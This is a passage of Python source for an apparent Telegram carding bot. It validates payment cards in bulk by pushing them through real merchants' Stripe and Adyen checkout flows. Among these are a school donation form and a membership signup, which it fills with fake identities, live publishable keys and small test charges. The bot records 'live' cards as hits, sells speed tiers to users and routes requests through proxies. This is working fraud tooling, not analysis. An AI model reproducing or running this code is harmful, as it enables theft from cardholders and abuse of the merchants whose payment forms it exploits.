        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {api_country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category


# ============ ADYEN DIRECT SINGLE CHECK ============
async def adyen_direct_single_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Single check logic for Adyen Direct gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    try:
        allowed, error_msg = await check_user_access(update, context, "adyen_direct")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        adyen_direct_active_tasks[u_id] = True
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        status_msg = await message.reply_text("🔄 Checking card with Adyen Direct...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        result = await check_card_adyen_direct(card, proxy_str, u_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        ui, status_category = format_adyen_direct_response(result, card, bin_info)
        
        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
        
        if status_category == "approved":
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="Adyen Direct",
                card=card,
                response=result.get("message", "Approved"),
                price="$??",
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            await save_hit_to_file(
                card=card,
                gateway="Adyen Direct",
                response=result.get("message", "Approved"),
                price="$??",
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_manager.increment_hits(u_id)
        
        user_manager.increment_checks(u_id)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Adyen Direct] Error: {traceback.format_exc()}")
    finally:
        adyen_direct_active_tasks.pop(u_id, None)


# ============ ADYEN DIRECT MASS CHECK ============
async def adyen_direct_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """Mass check logic for Adyen Direct gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    try:
        adyen_direct_active_tasks[u_id] = True
        
        approved, declined, errors = 0, 0, 0
        total = len(cards)
        start_time_session = time.time()
        results_sent = 0
        
        print(f"\n{'='*80}")
        print(f"🚀 [ADYEN DIRECT MASS CHECK] Starting batch for user {u_id}")
        print(f"📊 Total cards: {total}")
        print(f"{'='*80}")
        
        allowed, error_msg = await check_user_access(update, context, "adyen_direct")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        await message.reply_text(
            f"🔄 <b>Adyen Direct Batch Started</b>\n\n"
            f"📝 Cards: {total}\n"
            f"📍 Using Adyen Direct Gateway\n"
            f"⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour ({TIER_CONCURRENCY.get(tier, 1)} parallel)\n"
            f"📊 Only approved cards will be shown",
            parse_mode=ParseMode.HTML,
            reply_markup=stop_markup(u_id)
        )
        
        semaphore = asyncio.Semaphore(TIER_CONCURRENCY.get(tier, 1))
        
        async def check_with_control(card):
            async with semaphore:
                await speed_controller.wait_if_needed()
                
                start = time.time()
                proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
                result = await check_card_adyen_direct(card, proxy_str, u_id)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                return result, card, elapsed
        
        chunk_size = min(10, TIER_CONCURRENCY.get(tier, 1))
        for i in range(0, len(cards), chunk_size):
            if u_id not in adyen_direct_active_tasks:
                try:
                    await message.reply_text("🛑 <b>Session stopped</b>", parse_mode=ParseMode.HTML)
                except:
                    pass
                break
                
            chunk = cards[i:i+chunk_size]
            tasks = [check_with_control(card) for card in chunk]
            
            try:
                chunk_results = await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=180
                )
            except asyncio.TimeoutError:
                await message.reply_text("⚠️ Chunk processing timeout, continuing...")
                continue
            
            for idx, item in enumerate(chunk_results, i+1):
                if u_id not in adyen_direct_active_tasks:
                    break
                
                if isinstance(item, Exception):
                    print(f"❌ [Adyen Direct] Task exception: {item}")
                    errors += 1
                    continue
                
                result, card, elapsed = item
                
                try:
                    bin_info = await get_bin_info(card)
                    ui, status_category = format_adyen_direct_response(result, card, bin_info)
                except Exception as e:
                    print(f"❌ [Adyen Direct] Error formatting response: {e}")
                    errors += 1
                    continue
                
                if status_category == "approved":
                    try:
                        await save_hit_to_file(
                            card=card,
                            gateway="Adyen Direct",
                            response=result.get("message", "Approved"),
                            price="$??",
                            bin_info=bin_info,
                            user_id=u_id,
                            user_tier=tier
                        )
                    except Exception as e:
                        print(f"❌ [Adyen Direct] Error in hit notification: {e}")
                
                if status_category == "approved":
                    approved += 1
                    try:
                        stats = speed_controller.get_stats()
                        progress = int((idx/total)*10)
                        bar = "▓" * progress + "░" * (10 - progress)
                        
                        
                        await asyncio.wait_for(
                            message.reply_text(ui, parse_mode=ParseMode.HTML),
                            timeout=10
                        )
                        results_sent += 1
                        
                    except Exception as e:
                        print(f"❌ [Adyen Direct] Error sending approved message: {e}")
                        
                elif status_category == "declined":
                    declined += 1
                else:
                    errors += 1
                
                user_manager.increment_checks(u_id, 1)
                await asyncio.sleep(0.001)
        
        if u_id in adyen_direct_active_tasks:
            total_time = time.time() - start_time_session
            stats = speed_controller.get_stats()
            summary = (
                f"🏁 <b>Adyen Direct Session Finished</b>\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"📢 Results sent: {results_sent}\n"
                f"⚡ Speed: {stats['current_cph']:.0f}/{stats['target_cph']} cph\n"
                f"⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s"
            )
            try:
                await message.reply_text(summary, parse_mode=ParseMode.HTML)
            except Exception as e:
                print(f"❌ [Adyen Direct] Error sending summary: {e}")
            
    except Exception as e:
        print(f"❌ [Adyen Direct] Error in mass check: {e}")
        print(f"📝 Traceback: {traceback.format_exc()}")
        try:
            await message.reply_text(f"❌ Error in session: {str(e)[:100]}")
        except:
            pass
    finally:
        adyen_direct_active_tasks.pop(u_id, None)


# ============ ADYEN COMMAND HANDLERS ============
async def single_check_ad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Adyen gateway (/ad)"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "📦 <b>Adyen Single Check</b>\n\n"
            "Usage: <code>/ad card|mm|yyyy|cvv</code>\n"
            "Example: <code>/ad 4979465112466622|01|2032|043</code>\n\n"
            "This uses the Adyen Direct gateway via mixmax.com",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    card_text = " ".join(context.args).strip()
    card = card_formatter.extract_single_card_from_text(card_text)
    
    if not card:
        await update.message.reply_text(
            "❌ Invalid card format. Use: card|mm|yyyy|cvv\n"
            "Example: 4979465112466622|01|2032|043"
        )
        return
    
    # Fix: Call the correct function name
    await adyen_direct_single_check_logic(update, context, card)


async def mass_check_mad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Adyen gateway (/mad)"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if not context.args:
        await message.reply_text(
            "📦 <b>Adyen Mass Check</b>\n\n"
            "Usage: <code>/mad card1 card2 ...</code>\n"
            "Example: <code>/mad 4979465112466622|01|2032|043 4111111111111111|12|2025|123</code>\n\n"
            "Or with line breaks:\n"
            "<code>/mad 4979465112466622|01|2032|043</code>\n"
            "<code>/mad 4111111111111111|12|2025|123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check user access - FIXED: Change 'adyen' to 'adyen_direct'
    if not user_manager.can_access_gateway(user_id, 'adyen_direct'):
        await message.reply_text("❌ Your tier doesn't have access to Adyen gateway.")
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    # Check batch size limit
    tier = user_manager.get_tier(user_id)
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Fix: Call the correct function name
    await adyen_direct_mass_check_logic(update, context, cards)

# ============ STRIPE CHARGE GATEWAY ============
async def check_card_stripe_charge(card: str, amount: float = 1.00, proxy: str = None) -> Dict:
    """Stripe charge gate via texassouthernacademy.com"""
    try:
        card_num, exp_month, exp_year, cvv = card.split('|')
        
        if len(exp_year) == 4 and exp_year.startswith("20"):
            exp_year = exp_year[2:]
        
        random_num1 = random.randint(1, 4)
        random_num2 = random.randint(1, 99)
        
        client = await connection_pool.get_client("stripe_charge")
        
        headers1 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=Waiyan&card[number]={card_num}&card[cvc]={cvv}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff4aa9d6f0f%3B+stripe-js-v3%2Ff4aa9d6f0f%3B+card-element&key=pk_live_51LTAH3KQqBJAM2n1ywv46dJsjQWht8ckfcm7d15RiE8eIpXWXUvfshCKKsDCyFZG48CY68L9dUTB0UsbDQe32Zn700Qe4vrX0d'
        
        response = await client.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers1,
            content=data
        )
        
        if response.status_code != 200:
            try:
                error_data = response.json()
                error_msg = error_data.get('error', {}).get('message', 'Unknown error')
                return {"status": "declined", "result": "DECLINED", "message": error_msg}
            except:
                return {"status": "declined", "result": "DECLINED", "message": f"HTTP {response.status_code}"}
        
        pm_data = response.json()
        pm_id = pm_data.get('id')
        
        if not pm_id:
            return {"status": "declined", "result": "DECLINED", "message": "No payment method ID"}
        
        headers2 = {
            'authority': 'texassouthernacademy.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://texassouthernacademy.com',
            'referer': 'https://texassouthernacademy.com/donation/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        form_data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'donate',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': f'{amount:.2f}',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-billing-name': 'Waiyan',
            'wpfs-billing-address-country': 'US',
            'wpfs-billing-address-line-1': '7246 Royal Ln',
            'wpfs-billing-address-line-2': '',
            'wpfs-billing-address-city': 'Bellevue',
            'wpfs-billing-address-state': '',
            'wpfs-billing-address-state-select': 'NY',
            'wpfs-billing-address-zip': '10080',
            'wpfs-card-holder-email': f'Waiyan{random_num1}{random_num2}@gmail.com',
            'wpfs-card-holder-name': 'Waiyan',
            'wpfs-stripe-payment-method-id': pm_id,
        }
        
        response2 = await client.post(
            'https://texassouthernacademy.com/wp-admin/admin-ajax.php',
            headers=headers2,
            data=form_data
        )
        
        result = response2.json()
        success = result.get('success', False)
        message = result.get('message', 'No message')
        
        if success:
            if "charge" in message.lower() or "succeeded" in message.lower() or "success" in message.lower():
                return {"status": "success", "result": "CHARGE", "message": message}
            else:
                return {"status": "success", "result": "APPROVED", "message": message}
        else:
            if "insufficient" in message.lower():
                return {"status": "success", "result": "INSUFFICIENT_FUNDS", "message": message}
            elif "cvv" in message.lower() or "security code" in message.lower():
                return {"status": "success", "result": "CVV_LIVE", "message": message}
            elif "3d" in message.lower() or "secure" in message.lower():
                return {"status": "success", "result": "3D_REQUIRED", "message": message}
            else:
                return {"status": "declined", "result": "DECLINED", "message": message}
                
    except Exception as e:
        return {"status": "error", "message": str(e)[:100]}

def format_stripe_charge_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Stripe Charge response for display"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    status = result.get("status", "error")
    
    if status == "success":
        result_text = result.get("result", "Approved")
        message = result.get("message", "")
        if "CHARGE" in result_text:
            status_display = "✅ CHARGED"
            status_category = "charged"
        elif "3D_REQUIRED" in result_text:
            status_display = "🔐 3D REQUIRED"
            status_category = "approved"
        elif "INSUFFICIENT_FUNDS" in result_text:
            status_display = "💰 INSUFFICIENT FUNDS"
            status_category = "approved"
        elif "CVV_LIVE" in result_text:
            status_display = "✅ CVV LIVE"
            status_category = "approved"
        else:
            status_display = "✅ APPROVED"
            status_category = "approved"
        response_msg = f"{result_text}: {message}" if message else result_text
    elif status == "declined":
        result_text = result.get("result", "Declined")
        message = result.get("message", "")
        status_display = "❌ DECLINED"
        status_category = "declined"
        response_msg = f"{result_text}: {message}" if message else result_text
    else:
        status_display = "⚠️ ERROR"
        status_category = "error"
        response_msg = result.get("message", "Unknown error")
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Stripe Charge\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    return ui, status_category

async def stripe_charge_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """Mass check logic for Stripe Charge gateway - FIXED for multi-user"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    # REMOVED global semaphore acquisition
    # if not await user_semaphore.acquire():
    #     await message.reply_text("⚠️ Bot is busy with many users. Please try again in a moment.")
    #     return
    
    try:
        stripe_charge_active_tasks[u_id] = True
        
        charged, approved, declined, errors = 0, 0, 0, 0
        total = len(cards)
        start_time_session = time.time()
        amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
        
        tier = "free"  # Default
        if u_id == OWNER_ID:
            tier = "admin"
            
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        await message.reply_text(
            f"🔄 <b>Stripe Charge Batch Started</b>\n\n"
            f"📝 Cards: {total}\n"
            f"💰 Amount: ${amount} per card\n"
            f"💳 Using Stripe Charge Gateway\n"
            f"⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour ({TIER_CONCURRENCY.get(tier, 1)} parallel)\n"
            f"👥 Other users can still use the bot",
            parse_mode=ParseMode.HTML,
            reply_markup=stop_markup(u_id)
        )
        
        semaphore = asyncio.Semaphore(TIER_CONCURRENCY.get(tier, 1))
        
        async def check_with_control(card):
            async with semaphore:
                await speed_controller.wait_if_needed()
                
                start = time.time()
                proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
                result = await check_card_stripe_charge(card, amount=float(amount), proxy=proxy_str)
                elapsed = time.time() - start
                
                speed_controller.record_response(elapsed)
                
                return result, card, elapsed
        
        chunk_size = min(10, TIER_CONCURRENCY.get(tier, 1))
        for i in range(0, len(cards), chunk_size):
            if u_id not in stripe_charge_active_tasks:
                await message.reply_text("🛑 <b>Session stopped</b>", parse_mode=ParseMode.HTML)
                break
            
            chunk = cards[i:i+chunk_size]
            tasks = [check_with_control(card) for card in chunk]
            
            try:
                chunk_results = await asyncio.wait_for(
                    asyncio.gather(*tasks),
                    timeout=180
                )
            except asyncio.TimeoutError:
                await message.reply_text("⚠️ Chunk processing timeout, continuing...")
                continue
            
            for idx, (result, card, elapsed) in enumerate(chunk_results, i+1):
                if u_id not in stripe_charge_active_tasks:
                    break
                    
                bin_info = await get_bin_info(card)
                ui, status_category = format_stripe_charge_response(result, card, bin_info)
                
                if status_category in ["charged", "approved"]:
                    await save_hit_to_file(
                        card=card,
                        gateway="Stripe Charge",
                        response=result.get("message", "Approved"),
                        price=f"${amount}",
                        bin_info=bin_info,
                        user_id=u_id,
                        user_tier=tier
                    )
                
                if status_category in ["charged", "approved"]:
                    if status_category == "charged":
                        charged += 1
                        approved += 1
                    else:
                        approved += 1
                    
                    stats = speed_controller.get_stats()
                    progress = int((idx/total)*10)
                    bar = "▓" * progress + "░" * (10 - progress)
                    
                    
                    try:
                        await asyncio.wait_for(
                            message.reply_text(ui, parse_mode=ParseMode.HTML),
                            timeout=10
                        )
                    except asyncio.TimeoutError:
                        pass
                        
                elif status_category == "declined":
                    declined += 1
                else:
                    errors += 1
                
                await asyncio.sleep(0.001)
        
        if u_id in stripe_charge_active_tasks:
            total_time = time.time() - start_time_session
            stats = speed_controller.get_stats()
            summary = (
                f"🏁 <b>Stripe Charge Session Finished</b>\n\n"
                f"🔥 Charged: {charged}\n"
                f"✅ Approved: {approved-charged}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"⚡ Speed: {stats['current_cph']:.0f}/{stats['target_cph']} cph\n"
                f"⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s"
            )
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"[ERROR] {traceback.format_exc()}")
    finally:
        stripe_charge_active_tasks.pop(u_id, None)
        # REMOVED global semaphore release
        # user_semaphore.release()

async def stripe_charge_single_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Single check logic for Stripe Charge gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    try:
        allowed, error_msg = await check_user_access(update, context, "stripe_charge")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
        status_msg = await message.reply_text(f"🔄 Checking card with Stripe Charge (${amount})...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        result = await check_card_stripe_charge(card, amount=float(amount), proxy=proxy_str)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        ui, status_category = format_stripe_charge_response(result, card, bin_info)
        
        if status_category in ["charged", "approved"]:
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="Stripe Charge",
                card=card,
                response=result.get("message", "Approved"),
                price=f"${amount}",
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            await save_hit_to_file(
                card=card,
                gateway="Stripe Charge",
                response=result.get("message", "Approved"),
                price=f"${amount}",
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_manager.increment_checks(u_id)
        
        ui += f"\n[⌬] 𝐒𝐩𝐞𝐞𝐝 ↣ {elapsed:.2f}s"
        
        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Stripe Charge Single] Error: {traceback.format_exc()}")

# ============ STRIPE AUTH GATEWAY (FIXED) ============
STRIPE_BASE_URL = "https://alevelbiology.co.uk/membership/premium/"
STRIPE_AJAX_URL = "https://alevelbiology.co.uk/wp-admin/admin-ajax.php"
STRIPE_API_URL = "https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"

async def check_card_stripe_auth(card: str, proxy: str = None) -> Dict:
    """
    Check card using Stripe Auth gateway via alevelbiology.co.uk - FIXED
    """
    try:
        card_num, cc_mon, cc_year, cc_cvc = card.split("|")
        
        if len(cc_year) == 2:
            cc_year = f"20{cc_year}"
        
        # Run the synchronous requests in a thread pool to avoid blocking
        def _sync_check():
            session = requests.Session()
            
            if proxy:
                proxy_url = format_proxy(proxy)
                if proxy_url:
                    session.proxies = {
                        'http': proxy_url,
                        'https': proxy_url,
                    }
            
            retry_strategy = requests.adapters.Retry(
                total=2,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
            )
            adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            headers_get = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            }
            
            page = session.get(STRIPE_BASE_URL, headers=headers_get, timeout=30)
            
            if page.status_code != 200:
                return {
                    "status": "error",
                    "result": "PAGE_LOAD_FAILED",
                    "message": f"Failed to load page: HTTP {page.status_code}",
                    "status_display": "⚠️ PAGE LOAD FAILED",
                    "status_category": "error"
                }
            
            soup = BeautifulSoup(page.text, 'html.parser')
            
            all_inputs = soup.find_all('input')
            
            m1 = None
            m2 = None
            nonce = None
            
            for inp in all_inputs:
                name = inp.get('name', '')
                if 'rcp_math_1' in name or name == 'rcp_math_1':
                    m1 = inp.get('value')
                elif 'rcp_math_2' in name or name == 'rcp_math_2':
                    m2 = inp.get('value')
                elif 'rcp_register_nonce' in name or name == 'rcp_register_nonce':
                    nonce = inp.get('value')
            
            if not m1 or not m2 or not nonce:
                for inp in all_inputs:
                    name = inp.get('name', '')
                    value = inp.get('value', '')
                    
                    if not m1 and value and value.isdigit() and len(value) <= 2:
                        m1 = value
                    elif m1 and not m2 and value and value.isdigit() and len(value) <= 2:
                        m2 = value
                    elif not nonce and name and 'nonce' in name.lower():
                        nonce = value
            
            if not m1 or not m2 or not nonce:
                return {
                    "status": "error",
                    "result": "EXTRACTION_FAILED",
                    "message": "Could not extract form fields - site structure may have changed",
                    "status_display": "⚠️ EXTRACTION FAILED",
                    "status_category": "error"
                }
            
            math_ans = int(m1) + int(m2)
            
            timestamp = int(time.time())
            email = f"mokua{timestamp}@gmail.com"
            username = f"Mokuaj{timestamp}"
            
            reg_payload = {
                "rcp_user_first": "Geoffrey",
                "rcp_user_last": "Mokua",
                "rcp_user_email": email,
                "rcp_user_login": username,
                "rcp_user_pass": "paypal101KE",
                "rcp_user_pass_confirm": "paypal101KE",
                "clever_account_type": "Student",
                "rcp_gateway": "stripe",
                "rcp_card_name": "Geoffrey Mokua",
                "rcp_math_1": m1,
                "rcp_math_2": m2,
                "rcp_math_answer": math_ans,
                "membership_id": "0",
                "rcp_level": "5",
                "rcp_register_nonce": nonce,
                "action": "rcp_process_register_form",
                "rcp_ajax": "true"
            }

            headers_post = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://alevelbiology.co.uk",
                "Connection": "keep-alive",
                "Referer": STRIPE_BASE_URL,
            }

            try:
                reg_res = session.post(STRIPE_AJAX_URL, data=reg_payload, headers=headers_post, timeout=30)
                
                if reg_res.status_code != 200:
                    return {
                        "status": "error",
                        "result": "REGISTRATION_FAILED",
                        "message": f"HTTP {reg_res.status_code}",
                        "status_display": "⚠️ REGISTRATION FAILED",
                        "status_category": "error"
                    }
                
                try:
                    reg_json = reg_res.json()
                except:
                    return {
                        "status": "error",
                        "result": "JSON_PARSE_ERROR",
                        "message": "Invalid JSON response",
                        "status_display": "⚠️ PARSE ERROR",
                        "status_category": "error"
                    }
                
                if not reg_json.get("success"):
                    error_msg = reg_json.get('errors', 'Unknown Error')
                    if isinstance(error_msg, dict):
                        error_msg = str(error_msg)
                    
                    if "card" in error_msg.lower() or "payment" in error_msg.lower():
                        return {
                            "status": "declined",
                            "result": "DECLINED",
                            "message": error_msg,
                            "status_display": "❌ DECLINED",
                            "status_category": "declined"
                        }
                    else:
                        return {
                            "status": "error",
                            "result": "REGISTRATION_FAILED",
                            "message": error_msg,
                            "status_display": "⚠️ REGISTRATION FAILED",
                            "status_category": "error"
                        }
                
                try:
                    gateway_data = reg_json["data"]["gateway"]["data"]
                    client_secret = gateway_data.get("stripe_client_secret")
                    if not client_secret:
                        client_secret = gateway_data.get("client_secret")
                    
                    if not client_secret:
                        return {
                            "status": "error",
                            "result": "NO_CLIENT_SECRET",
                            "message": "Missing client secret",
                            "status_display": "⚠️ MISSING SECRET",
                            "status_category": "error"
                        }
                    
                    pi_id = client_secret.split('_secret')[0]
                except Exception as e:
                    return {
                        "status": "error",
                        "result": "EXTRACTION_FAILED",
                        "message": f"Failed to extract payment data: {str(e)[:100]}",
                        "status_display": "⚠️ EXTRACTION FAILED",
                        "status_category": "error"
                    }
            except Exception as e:
                return {
                    "status": "error",
                    "result": "REGISTRATION_ERROR",
                    "message": f"Registration failed: {str(e)[:100]}",
                    "status_display": "⚠️ REGISTRATION ERROR",
                    "status_category": "error"
                }

            stripe_payload = {
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": card_num,
                "payment_method_data[card][cvc]": cc_cvc,
                "payment_method_data[card][exp_month]": cc_mon,
                "payment_method_data[card][exp_year]": cc_year,
                "payment_method_data[billing_details][name]": "Geoffrey Mokua",
                "key": "pk_live_519J2ZeBM5rLF0Iwhd0pcdEFRCOBdsEwibF9y2qZi2Aaa5UVOwloNwlWBumbdzQicJEa3YjpjpmWg7dm7lGIwupJh00Bruz4G2n",
                "client_secret": client_secret,
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true"
            }

            headers_stripe = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            try:
                confirm_res = session.post(STRIPE_API_URL.format(pi_id=pi_id), data=stripe_payload, headers=headers_stripe, timeout=30)
                
                if confirm_res.status_code == 200:
                    return {
                        "status": "success",
                        "result": "APPROVED",
                        "message": "Card approved successfully",
                        "status_display": "✅ APPROVED",
                        "status_category": "approved"
                    }
                else:
                    try:
                        final_json = confirm_res.json()
                        error = final_json.get("error", {})
                        msg = error.get("message", "Declined")
                        code = error.get("code", "")
                        decline_code = error.get("decline_code", "")
                        
                        full_msg = msg
                        if code:
                            full_msg += f" ({code})"
                        if decline_code:
                            full_msg += f" [{decline_code}]"
                        
                        if "cvc" in msg.lower() or "security code" in msg.lower():
                            return {
                                "status": "success",
                                "result": "CVV_LIVE",
                                "message": f"CVV Live: {msg}",
                                "status_display": "✅ CVV LIVE",
                                "status_category": "approved"
                            }
                        elif "insufficient" in msg.lower():
                            return {
                                "status": "success",
                                "result": "INSUFFICIENT_FUNDS",
                                "message": f"Insufficient Funds: {msg}",
                                "status_display": "💰 INSUFFICIENT FUNDS",
                                "status_category": "approved"
                            }
